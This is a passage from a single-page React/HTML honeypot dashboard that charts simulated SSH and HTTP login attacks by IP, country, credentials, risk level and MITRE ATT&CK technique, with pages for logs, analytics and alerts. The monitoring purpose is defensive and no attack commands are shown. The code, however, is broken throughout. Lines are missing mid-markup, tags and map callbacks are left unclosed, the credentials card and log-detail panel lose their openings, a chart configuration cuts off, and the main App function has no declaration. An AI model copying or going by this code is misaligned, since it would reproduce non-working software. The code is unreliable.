      charts.push(new Chart(chartRefs.mitre.current.getContext("2d"), {
        type: "bar",
        data: {
          labels: topMitre.map(([t]) => t),
          datasets: [{
            data: topMitre.map(([,c]) => c),
            backgroundColor: "rgba(255,60,110,0.3)",
            borderColor: "#ff3c6e",
            borderWidth: 1,
          }],
        },
        options: { ...CHART_DEFAULTS,
          indexAxis: "y",
          scales: {
            x: { ticks:{color:"#4a7a99",font:{family:"'Share Tech Mono'",size:9}}, grid:{color:"rgba(26,48,64,0.4)"} },
            y: { ticks:{color:"#00d4ff",font:{family:"'Share Tech Mono'",size:11}}, grid:{color:"rgba(26,48,64,0.4)"} },
          },
        },
      }));
    }

    return () => charts.forEach(c => c.destroy());
  }, []);

  const avgRisk = Math.round(logs.reduce((s,l) => s + l.risk.score, 0) / logs.length);
  const unack = alerts.filter(a => !a.acknowledged).length;

  return (
    <div className="page fade-in">
      <div className="page-header">
        <div>
          <div className="page-title">DASHBOARD</div>
          <div className="page-subtitle">REAL-TIME THREAT INTELLIGENCE OVERVIEW</div>
        </div>
      </div>

      <div className="stat-grid mb-6">
        <StatCard label="TOTAL CAPTURES" value={logs.length} delta={`${logs.filter(l=>new Date(l.timestamp)>new Date(Date.now()-86400000)).length} in last 24h`} icon="🎯" color="var(--accent)" />
        <StatCard label="CRITICAL THREATS" value={riskDist.CRITICAL} delta={`${Math.round(riskDist.CRITICAL/logs.length*100)}% of total`} icon="⚡" color="var(--critical)" />
        <StatCard label="ACTIVE ALERTS" value={unack} delta="Requires attention" icon="🔔" color="var(--high)" />
        <StatCard label="AVG RISK SCORE" value={avgRisk} delta="0–100 scale" icon="📊" color="var(--accent3)" />
      </div>

      {/* Timeline + Risk Donut */}
      <div className="grid-2-1 mb-4">
        <div className="card">
          <div className="card-title"><span className="card-title-icon">📈</span>ATTACK TIMELINE — LAST 24 HOURS</div>
          <div className="chart-wrap"><canvas ref={chartRefs.timeline} /></div>
        </div>
        <div className="card">
          <div className="card-title"><span className="card-title-icon">🎯</span>RISK DISTRIBUTION</div>
          <div className="chart-wrap"><canvas ref={chartRefs.risk} /></div>
        </div>
      </div>

      {/* Top IPs + Service + MITRE */}
      <div className="grid-3 mb-4">
        <div className="card">
          <div className="card-title"><span className="card-title-icon">🌐</span>TOP ATTACKING IPs</div>
          {topIPs.map(([ip, count], i) => (
            <div key={ip} className="progress-row">
              <div className="progress-label">{GEO_DATA[ip]?.flag} {ip}</div>
              <div className="progress-bar"><div className="progress-fill" style={{ width: `${count/topIPs[0][1]*100}%` }} /></div>
              <div className="progress-count">{count}</div>

        <div className="card">

              <div className="progress-bar"><div className="progress-fill" style={{ width: `${count/topCreds[0][1]*100}%`, background: "linear-gradient(90deg,var(--accent2),var(--high))" }} /></div>
              <div className="progress-count">{count}</div>
            </div>

        </div>
        <div className="card">
          <div className="card-title"><span className="card-title-icon">🛡</span>MITRE ATT&CK TECHNIQUES</div>
          <div className="chart-wrap-sm"><canvas ref={chartRefs.mitre} /></div>

      </div>

      {/* Service Split + World Map (ASCII) */}
      <div className="grid-2-1">
        <div className="card">
          <div className="card-title"><span className="card-title-icon">🌍</span>ATTACKER ORIGIN — TOP COUNTRIES</div>
          {(() => {
            const cc = {};
            logs.forEach(l => { cc[l.geo.country] = (cc[l.geo.country]||0)+1; });
            return Object.entries(cc).sort((a,b)=>b[1]-a[1]).slice(0,8).map(([c,n]) => {
              const geo = Object.values(GEO_DATA).find(g => g.country === c);
              return (
                <div key={c} className="progress-row">
                  <div className="progress-label">{geo?.flag} {c}</div>

                  <div className="progress-count">{n}</div>
                </div>
              );

          })()}
        </div>
        <div className="card">
          <div className="card-title"><span className="card-title-icon">🔗</span>SERVICE BREAKDOWN</div>
          <div className="chart-wrap"><canvas ref={chartRefs.service} /></div>
        </div>
      </div>
    </div>
  );
}

function LogsPage({ logs, alerts }) {
  const [filterRisk, setFilterRisk] = useState("ALL");
  const [filterService, setFilterService] = useState("ALL");
  const [search, setSearch] = useState("");
  const [selected, setSelected] = useState(null);
  const [page, setPage] = useState(0);
  const PER_PAGE = 20;

  const filtered = logs.filter(l => {
    if (filterRisk !== "ALL" && l.risk.level !== filterRisk) return false;
    if (filterService !== "ALL" && l.service !== filterService) return false;
    if (search && !l.attacker_ip.includes(search) && !l.username.includes(search) && !l.password.includes(search)) return false;
    return true;
  });

  const paged = filtered.slice(page * PER_PAGE, (page+1) * PER_PAGE);
  const totalPages = Math.ceil(filtered.length / PER_PAGE);

  return (
    <div className="page fade-in">
      <div className="page-header">
        <div>
          <div className="page-title">ATTACK LOGS</div>
          <div className="page-subtitle">{filtered.length} RECORDS MATCHING FILTER</div>
        </div>
        <div className="page-actions">
          <button className="btn btn-ghost" onClick={() => { setFilterRisk("ALL"); setFilterService("ALL"); setSearch(""); }}>↺ RESET</button>
        </div>
      </div>

      <div className="filter-bar">
        <input className="input-field" style={{ width: 220 }} value={search}
          onChange={e => { setSearch(e.target.value); setPage(0); }}
          placeholder="Search IP, username, password..." />
        <select className="filter-select" value={filterRisk} onChange={e => { setFilterRisk(e.target.value); setPage(0); }}>
          <option value="ALL">All Risk Levels</option>
          <option value="CRITICAL">Critical</option>
          <option value="HIGH">High</option>
          <option value="MEDIUM">Medium</option>
          <option value="LOW">Low</option>
        </select>
        <select className="filter-select" value={filterService} onChange={e => { setFilterService(e.target.value); setPage(0); }}>
          <option value="ALL">All Services</option>
          <option value="ssh">SSH</option>
          <option value="http">HTTP</option>

        <div style={{ marginLeft: "auto", fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: "var(--text-dim)" }}>
          Page {page+1} / {totalPages}
        </div>
      </div>

      <div style={{ display: "grid", gridTemplateColumns: selected ? "1fr 380px" : "1fr", gap: 16 }}>
        <div className="card" style={{ padding: 0, overflow: "hidden" }}>
          <table className="data-table">
            <thead>
              <tr>
                <th>TIMESTAMP</th>
                <th>IP ADDRESS</th>
                <th>LOCATION</th>
                <th>SERVICE</th>
                <th>USERNAME</th>
                <th>PASSWORD</th>
                <th>RISK</th>
                <th>MITRE</th>
              </tr>
            </thead>
            <tbody>
              {paged.map(log => (
                <tr key={log.id} onClick={() => setSelected(selected?.id === log.id ? null : log)}
                  style={{ cursor: "pointer", background: selected?.id === log.id ? "rgba(0,212,255,0.05)" : undefined }}>
                  <td style={{ color: "var(--text-dim)", whiteSpace: "nowrap" }}>
                    <TimeAgo ts={log.timestamp} />
                  </td>
                  <td style={{ color: "var(--accent)", fontWeight: 700 }}>{log.attacker_ip}</td>
                  <td>{log.geo.flag} {log.geo.city}</td>
                  <td><ServiceBadge service={log.service} /></td>
                  <td style={{ color: "var(--accent3)" }}>{log.username}</td>
                  <td style={{ color: "var(--accent2)" }}>{log.password}</td>
                  <td><RiskBadge level={log.risk.level} /></td>
                  <td>{log.mitre_tags.map(t => <span key={t} className="mitre-tag">{t}</span>)}</td>
                </tr>
              ))}
            </tbody>
          </table>
          <div style={{ padding: "12px 16px", display: "flex", gap: 8, borderTop: "1px solid var(--border)" }}>
            <button className="btn btn-ghost" onClick={() => setPage(p => Math.max(0, p-1))} disabled={page === 0}>◁ PREV</button>
            <button className="btn btn-ghost" onClick={() => setPage(p => Math.min(totalPages-1, p+1))} disabled={page >= totalPages-1}>NEXT ▷</button>
          </div>
        </div>

        {selected && (

            <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 16 }}>
              <div className="card-title">📋 LOG DETAIL</div>
              <button className="btn btn-ghost" style={{ padding: "2px 8px" }} onClick={() => setSelected(null)}>✕</button>
            </div>
            <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, lineHeight: 2 }}>
              {[
                ["ID", selected.id.slice(0,16) + "..."],
                ["IP", selected.attacker_ip],

                ["COORDS", `${selected.geo.lat.toFixed(2)}, ${selected.geo.lon.toFixed(2)}`],

                <div key={k} style={{ display: "flex", gap: 8 }}>
                  <span style={{ color: "var(--text-dim)", width: 90 }}>{k}</span>
                  <span style={{ color: "var(--text)", flex: 1, wordBreak: "break-all" }}>{v}</span>
                </div>
              ))}
              <div style={{ marginTop: 8 }}>
                <div style={{ color: "var(--text-dim)" }}>MITRE TAGS</div>
                <div style={{ marginTop: 4 }}>{selected.mitre_tags.map(t => <span key={t} className="mitre-tag">{t}</span>)}</div>
              </div>
              {selected.commands.length > 0 && (
                <div style={{ marginTop: 8 }}>
                  <div style={{ color: "var(--text-dim)", marginBottom: 4 }}>COMMANDS EXECUTED</div>
                  {selected.commands.map((c, i) => (
                    <div key={i} style={{ color: "var(--accent3)", background: "var(--bg0)", padding: "3px 8px", marginBottom: 2 }}>$ {c}</div>
                  ))}
                </div>
              )}
              <div style={{ marginTop: 12 }}>
                <div style={{ color: "var(--text-dim)", marginBottom: 6 }}>RISK METER</div>
                <div className="risk-bar-track">
                  <div className="risk-bar-fill" style={{
                    width: `${selected.risk.score}%`,
                    background: selected.risk.level === "CRITICAL" ? "var(--critical)"
                      : selected.risk.level === "HIGH" ? "var(--high)"
                      : selected.risk.level === "MEDIUM" ? "var(--medium)"
                      : "var(--low)",
                  }} />
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

function AnalyticsPage({ logs }) {
  const chartRefs = { country: useRef(null), hourly: useRef(null), scatter: useRef(null) };

  const cc = {};
  logs.forEach(l => { cc[l.geo.country] = (cc[l.geo.country]||0)+1; });
  const topCountries = Object.entries(cc).sort((a,b)=>b[1]-a[1]).slice(0,8);

  const hourly = Array(24).fill(0);
  logs.forEach(l => { hourly[new Date(l.timestamp).getHours()]++; });

  const mlData = (() => {
    const ipStats = {};
    logs.forEach(l => {
      if (!ipStats[l.attacker_ip]) ipStats[l.attacker_ip] = { attempts: 0, commands: 0, score: 0, level: "", country: "" };
      ipStats[l.attacker_ip].attempts++;
      ipStats[l.attacker_ip].commands += l.commands.length;
      ipStats[l.attacker_ip].score = l.risk.score;
      ipStats[l.attacker_ip].level = l.risk.level;
      ipStats[l.attacker_ip].country = l.geo.country;
    });
    return Object.entries(ipStats).map(([ip, s]) => ({
      ip, ...s,
      classification: s.score >= 50 ? "MALICIOUS" : s.score >= 25 ? "SUSPICIOUS" : "BENIGN",
      anomaly: parseFloat((s.score/100 * (0.5 + Math.random()*0.5)).toFixed(3)),
    })).sort((a,b) => b.score - a.score);
  })();

  const CHART_DEFAULTS = {
    responsive: true, maintainAspectRatio: false,
    plugins: { legend: { display: false }, tooltip: {
      backgroundColor: "#0a1520", borderColor: "#1a3040", borderWidth: 1,
      titleColor: "#00d4ff", bodyColor: "#c8e6f5",
      titleFont: { family: "'Share Tech Mono'" }, bodyFont: { family: "'Share Tech Mono'" },
    }},
  };

  useEffect(() => {
    const charts = [];

    if (chartRefs.country.current) {
      charts.push(new Chart(chartRefs.country.current.getContext("2d"), {
        type: "bar",
        data: {
          labels: topCountries.map(([c]) => c),

function AlertsPage({ alerts, setAlerts }) {
  const unack = alerts.filter(a => !a.acknowledged);
  const ack = alerts.filter(a => a.acknowledged);

  const acknowledge = (id) => {
    setAlerts(prev => prev.map(a => a.id === id ? { ...a, acknowledged: true } : a));
  };

  const acknowledgeAll = () => {
    setAlerts(prev => prev.map(a => ({ ...a, acknowledged: true })));
  };

  const severityIcon = { CRITICAL: "⚡", HIGH: "🔴", MEDIUM: "🟡", LOW: "🟢" };
  const severityClass = { CRITICAL: "alert-critical", HIGH: "alert-high", MEDIUM: "alert-medium", LOW: "alert-medium" };

  return (
    <div className="page fade-in">
      <div className="page-header">
        <div>
          <div className="page-title">ALERTS</div>
          <div className="page-subtitle">{unack.length} ACTIVE · {ack.length} ACKNOWLEDGED</div>
        </div>
        <div className="page-actions">
          {unack.length > 0 && (
            <button className="btn btn-ghost" onClick={acknowledgeAll}>✓ ACK ALL</button>
          )}
        </div>
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "repeat(4,1fr)", gap: 16, marginBottom: 24 }}>
        {["CRITICAL","HIGH","MEDIUM","LOW"].map(sev => {
          const count = alerts.filter(a => a.severity === sev && !a.acknowledged).length;
          const colors = { CRITICAL:"var(--critical)", HIGH:"var(--high)", MEDIUM:"var(--medium)", LOW:"var(--low)" };
          return (
            <div key={sev} className="stat-card" style={{ "--c": colors[sev] }}>
              <div className="stat-label">{sev}</div>
              <div className="stat-value">{count}</div>
              <div className="stat-delta">Active alerts</div>

      </div>

      {unack.length > 0 && (
        <div className="card mb-4">
          <div className="card-title">⚡ ACTIVE ALERTS</div>
          {unack.map(alert => (
            <div key={alert.id} className={`alert-item ${severityClass[alert.severity]}`}>
              <div className="alert-icon">{severityIcon[alert.severity]}</div>
              <div className="alert-body">
                <div className="alert-title">{alert.title}</div>
                <div className="alert-desc">{alert.description}</div>
                <div className="alert-time">
                  <TimeAgo ts={alert.timestamp} /> · {new Date(alert.timestamp).toLocaleString()} · Source: {alert.source_ip}

              <button className="alert-ack-btn" onClick={() => acknowledge(alert.id)}>✓ ACK</button>
            </div>
          ))}
        </div>
      )}

      {ack.length > 0 && (
        <div className="card">
          <div className="card-title">✓ ACKNOWLEDGED</div>
          {ack.map(alert => (
            <div key={alert.id} className={`alert-item ack ${severityClass[alert.severity]}`}>
              <div className="alert-icon">{severityIcon[alert.severity]}</div>
              <div className="alert-body">
                <div className="alert-title">{alert.title}</div>
                <div className="alert-desc">{alert.description}</div>
                <div className="alert-time"><TimeAgo ts={alert.timestamp} /></div>
              </div>
              <span style={{ fontFamily:"'Share Tech Mono',monospace", fontSize:10, color:"var(--accent3)", alignSelf:"center" }}>✓ CLEARED</span>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

  const unack = alerts.filter(a => !a.acknowledged).length;
  const critCount = logs.filter(l => l.risk.level === "CRITICAL").length;
  const threatLevel = Math.round(critCount / logs.length * 100);

  // Simulate new attacks every 15 seconds
  useEffect(() => {
    const t = setInterval(() => {
      const ip = pick(IPS);
      const cred = pick(CREDS);
      const geo = GEO_DATA[ip];
      const cmds = Math.random() > 0.7 ? sample(COMMANDS_POOL, rnd(0,3)) : [];
      const risk = computeRisk(ip, rnd(1,15), cmds);
      const newLog = {
        id: `auto-${Date.now()}`,
        attacker_ip: ip,
        timestamp: new Date().toISOString(),
        service: Math.random() > 0.45 ? "ssh" : "http",
        username: cred[0], password: cred[1],
        commands: cmds, geo, risk,
        headers: { "User-Agent": pick(USERAGENTS) },
        mitre_tags: sample(MITRE_POOL, rnd(1,2)),
        attempts: rnd(1,10),
        live: true,
      };
      setLogs(prev => [newLog, ...prev]);
    }, 15000);
    return () => clearInterval(t);
  }, []);

  const sections = [...new Set(NAV_ITEMS.map(i => i.section))];

                  <span className="nav-icon">{item.icon}</span>

          {page === "analytics" && <AnalyticsPage logs={logs} />}
          {page === "alerts"    && <AlertsPage alerts={alerts} setAlerts={setAlerts} />}
          {page === "admin"     && <AdminPage />}
        </div>
      </div>
    </div>
  );
}

ReactDOM.createRoot(document.getElementById("root")).render(<App />);
</script>
</body>
</html>
